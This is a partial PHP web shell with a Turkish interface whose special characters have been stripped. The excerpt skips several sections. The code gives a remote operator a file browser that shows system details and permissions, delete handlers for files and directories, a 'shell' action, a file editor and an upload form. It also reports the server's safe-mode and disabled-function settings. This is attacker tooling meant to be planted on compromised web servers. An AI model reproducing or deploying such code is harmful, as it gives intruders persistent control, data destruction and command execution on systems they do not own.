...
'uploadok'=>'Baaryla Yklendi.',
'dircrt'=>'Klasr Oluturuldu.',
'dontlist'=>'Listelenemiyor zin Yok.',
'dircrterr'=>'Oluturulamyor zin Yok.',
'dirnf'=>'Dizin Bulunamadi.',
'filenf'=>'.',
'dontwrdir'=>'Sadece Okunabilir.',
'empty'=>'Dizin Bo Deil Yada zin Yok.',
'deletefileok'=>'Dosya Silindi.',
'deletedirok'=>'Klasr Silindi.',
'isdontfile'=>'Ltfen Full Url Yazn. c:/program files/a.php Gibi',
'cantrfile'=>'Dosya Alamyor izin Yok.',
'onlyracc'=>'Dosya Editlenemiyor Okuma zni Var Sadece..',
'workdir'=>'alma Dizini: ',
'fullacc'=>'Full Yetki.',
'fullaccdir'=>'Full Yetkiniz Var Dosya Silip Dzenleyebilirsiniz.',
'thisnodir'=>'Klasr Sein.',
'allfuncsh'=>'Fonksiyonlar Kapal.'
);
...
//delete file
if($action=="delete"){ 
if(unlink($file)) $content.=$lang['deletefileok']."<a href=\"#\" onclick=\"document.reqs.action.value='viewer';document.reqs.dir.value='".$dir."'; document.reqs.submit();\"> AnaSayfaya Dnemk in Tklaynz.</a>";
}
//delete dir
if($action=="deletedir"){ 
if(!rmdir($file)) $content.=$lang['empty']."<a href=\"#\" onclick=\"document.reqs.action.value='viewer';document.reqs.dir.value='".$dir."'; document.reqs.submit();\"> AnaSayfaya Dnemk in Tklaynz.</a>";
else $content.=$lang['deletedirok']."<a href=\"#\" onclick=\"document.reqs.action.value='viewer';document.reqs.dir.value='".$dir."'; document.reqs.submit();\"> AnaSayfaya Dnemk in Tklaynz.</a>";
}
//shell
if($action=="shell"){
...
if($action=="editor"){
  ...
  Dosyann Ad (Full Url Yazn)<input type=text name=file value=\"".($file=="" ? $file=$dir : $file=$file)."\" size=50><input type=submit value=\"Editle\"></form>";	  
...
$content.="<tr><td><form method=POST>Klasore Git:<input type=text name=dir value=\"".$dir."\" size=50><input type=submit value=\"Git\"></form></td></tr>";
  if (is_dir($dir)) {
    if (@$dh = opendir($dir)) {
		...
		$content.="<tr><td>Sistem: ".@php_uname()."</td></tr><tr><td></td><td>Biim</td><td>Boyut</td><td>izin</td><td>Seenekler</td></tr>";
		for($i=0;$i<count($dire);$i++) {
		  $link=$dir.$dire[$i];
		  $content.='<tr><td><a href="#" onclick="document.reqs.action.value=\'viewer\'; document.reqs.dir.value=\''.$link.'\'; document.reqs.submit();">'.$dire[$i].'<a/></td><td>Klasor</td><td></td><td>'.perms($link).'</td><td><a href="#" onclick="document.reqs.action.value=\'deletedir\'; document.reqs.file.value=\''.$link.'\'; document.reqs.submit();" title="Klasr Sil">X</a></td></tr>';  
		}
...
if($action=="upload"){
  ...
  Buraya Uploadla:<input type=text name=dirupload value=\"".$dirupload."\" size=50></tr></td><tr><td>Dosyay Adlandr (Gerekli) :<input type=text name=filename></td></tr><tr><td><input type=file name=file><input type=submit name=uploadloc value='Upload Et'></td></tr>";
...
<table style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1> <tr><td><span class="style8">Safe mode:</span> <?php echo $safe_mode;?><br>
      <span class="style8">Fonksiyon Kstlamas:</span> <?php echo $disfunc;?><br>
